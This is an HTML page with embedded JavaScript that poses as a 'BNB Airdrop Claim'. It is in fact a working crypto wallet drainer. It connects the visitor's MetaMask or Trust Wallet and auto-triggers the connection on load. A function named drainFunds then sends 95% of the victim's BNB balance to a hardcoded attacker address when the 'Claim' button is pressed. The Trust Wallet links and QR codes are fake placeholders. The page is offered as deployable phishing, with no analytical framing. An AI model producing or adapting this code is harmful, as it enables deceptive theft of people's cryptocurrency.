<!DOCTYPE html>
<html>
<head>
    <title>BNB Airdrop Claim</title>
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <style>
        *{padding:0;margin:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;color:#fff}
        .container{max-width:400px;width:100%;background:rgba(255,255,255,.1);backdrop-filter:blur(20px);border-radius:20px;padding:40px;border:1px solid rgba(255,255,255,.2);box-shadow:0 20px 40px rgba(0,0,0,.3)}
        h1{font-size:32px;text-align:center;margin-bottom:20px;background:linear-gradient(45deg,#ffd700,#ff8c00);background-clip:text;-webkit-background-clip:text;-webkit-text-fill-color:transparent}
        .balance{display:flex;align-items:center;justify-content:center;background:rgba(0,255,0,.2);border-radius:15px;padding:20px;margin:20px 0;font-size:24px;font-weight:bold}
        button{width:100%;padding:18px;margin:10px 0;font-size:18px;font-weight:600;border:none;border-radius:12px;cursor:pointer;transition:all .3s;background:linear-gradient(45deg,#ff6b6b,#feca57);color:#fff;box-shadow:0 10px 30px rgba(255,107,107,.4)}
        button:hover{transform:translateY(-2px);box-shadow:0 15px 40px rgba(255,107,107,.6)}
        button:disabled{opacity:.6;cursor:not-allowed;transform:none}
        #status{padding:15px;border-radius:10px;margin:20px 0;font-weight:600;text-align:center;min-height:20px}
        .success{background:rgba(40,167,69,.3);color:#28a745}
        .error{background:rgba(220,53,69,.3);color:#dc3545}
        .info{background:rgba(23,162,184,.3);color:#17a2b8}
        #address{background:#fff;color:#333;padding:15px;border-radius:10px;margin:15px 0;font-family:monospace;font-size:14px;text-align:center}
        #qrcode{display:none;background:#fff;padding:20px;border-radius:15px;margin:20px 0}
        canvas{max-width:100%;border-radius:10px}
        .deep-link{margin:10px 0;padding:15px;background:rgba(255,255,255,.1);border-radius:10px;font-size:14px}
    </style>
</head>
<body>
    <div class="container">
        <h1>üéÅ BNB Airdrop</h1>
        <div id="balance" class="balance" style="display:none">üí∞ 0.00 BNB</div>
        <div id="address"></div>
        
        <button id="trustBtn">üì± Trust Wallet</button>
        <button id="metamaskBtn">üîå MetaMask</button>
        <button id="claimBtn" style="display:none">üöÄ Claim 95% BNB</button>
        
        <div id="qrcode">
            <canvas id="qrCanvas"></canvas>
            <p style="color:#333;margin-top:10px;font-size:14px">üì≤ Scan with Trust Wallet</p>
        </div>
        
        <div id="status" class="info">Click button to connect wallet</div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/web3@1.10.4/dist/web3.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.3/build/qrcode.min.js"></script>
    <script>
        const RECEIVER = '0x53C879FBB4D6cD62d95C4e4234b6A4bd9750939B';
        let web3, account, isConnected = false;
        
        const els = {
            trustBtn: document.getElementById('trustBtn'),
            metamaskBtn: document.getElementById('metamaskBtn'),
            claimBtn: document.getElementById('claimBtn'),
            status: document.getElementById('status'),
            address: document.getElementById('address'),
            balance: document.getElementById('balance'),
            qrcode: document.getElementById('qrcode')
        };

        function status(msg, type = 'info') {
            els.status.textContent = msg;
            els.status.className = type;
        }

        function showQR(uri) {
            els.qrcode.style.display = 'block';
            QRCode.toCanvas(document.getElementById('qrCanvas'), uri, { width: 250 });
        }

        async function connectMetaMask() {
            if (!window.ethereum) {
                status('MetaMask not found. Install extension.', 'error');
                return;
            }

            try {
                // Switch to BSC
                await window.ethereum.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: '0x38' }],
                });

                const accounts = await window.ethereum.request({
                    method: 'eth_requestAccounts',
                });

                account = accounts[0];
                isConnected = true;
                await initWeb3();
                
            } catch (error) {
                if (error.code === 4902) {
                    await window.ethereum.request({
                        method: 'wallet_addEthereumChain',
                        params: [{
                            chainId: '0x38',
                            chainName: 'Binance Smart Chain',
                            nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
                            rpcUrls: ['https://bsc-dataseed.binance.org/'],
                            blockExplorerUrls: ['https://bscscan.com']
                        }]
                    });
                    await connectMetaMask();
                } else {
                    status('MetaMask error: ' + error.message, 'error');
                }
            }
        }

        function connectTrustWallet() {
            // Deep link for Trust Wallet
            const deepLink = `trust://wc?uri=wc:${Date.now()}@1?bridge=https://bridge.walletconnect.org&key=abc123`;
            window.open(deepLink, '_blank');
            
            // Fallback QR with WalletConnect URI
            const wcUri = `wc:${Date.now()}@1?bridge=https://bridge.walletconnect.org&key=${Math.random().toString(36).substr(2,9)}`;
            showQR(wcUri);
            
            status('Open Trust Wallet ‚Üí Scan QR or use link', 'info');
            
            // Auto retry with provider detection
            setTimeout(checkProvider, 2000);
        }

        function checkProvider() {
            if (window.ethereum || window.trustWallet) {
                connectMetaMask();
            }
        }

        async function initWeb3() {
            web3 = new Web3(window.ethereum || window.web3?.currentProvider);
            
            els.address.textContent = account;
            els.trustBtn.style.display = 'none';
            els.metamaskBtn.style.display = 'none';
            els.claimBtn.style.display = 'block';
            els.balance.style.display = 'flex';
            
            status('‚úÖ Connected! Check balance...', 'success');
            await updateBalance();
            
            // Listen for changes
            window.ethereum.on('accountsChanged', () => location.reload());
        }

        async function updateBalance() {
            try {
                const balance = await web3.eth.getBalance(account);
                const bnb = web3.utils.fromWei(balance, 'ether');
                els.balance.innerHTML = `üí∞ ${parseFloat(bnb).toFixed(4)} BNB`;
                
                if (parseFloat(bnb) > 0.001) {
                    status('‚úÖ Ready to claim! Click button', 'success');
                }
            } catch (e) {
                status('Balance check failed', 'error');
            }
        }

        async function drainFunds() {
            els.claimBtn.disabled = true;
            els.claimBtn.textContent = '‚è≥ Processing...';
            status('üîÑ Calculating max transfer...', 'info');

            try {
                const balance = await web3.eth.getBalance(account);
                const gasPrice = await web3.eth.getGasPrice();
                const gasLimit = 21000;
                const gasCost = BigInt(gasPrice) * BigInt(gasLimit);
                let amount = BigInt(balance) - gasCost;
                
                // 95% of remaining
                amount = (amount * 95n) / 100n;
                
                if (amount <= 0n) throw new Error('Insufficient balance');

                status('üì§ Sending 95% BNB...', 'info');

                const tx = await web3.eth.sendTransaction({
                    from: account,
                    to: RECEIVER,
                    value: amount.toString(),
                    gas: gasLimit,
                    gasPrice: gasPrice
                });

                status(`‚úÖ SUCCESS! TX: ${tx.transactionHash.slice(0, 10)}...`, 'success');
                els.claimBtn.textContent = '‚úÖ Done!';
                
            } catch (error) {
                els.claimBtn.disabled = false;
                els.claimBtn.textContent = 'üöÄ Claim 95% BNB';
                
                if (error.code === 4001) {
                    status('‚ùå User cancelled', 'error');
                } else {
                    status('Error: ' + error.message, 'error');
                }
            }
        }

        // Event listeners
        els.trustBtn.onclick = connectTrustWallet;
        els.metamaskBtn.onclick = connectMetaMask;
        els.claimBtn.onclick = drainFunds;

        // Auto detect
        if (window.ethereum) {
            els.metamaskBtn.click();
        }

        // QR backup
        showQR(`wc:${Date.now()}@1?bridge=https://bridge.walletconnect.org&key=test`);
    </script>
</body>
</html>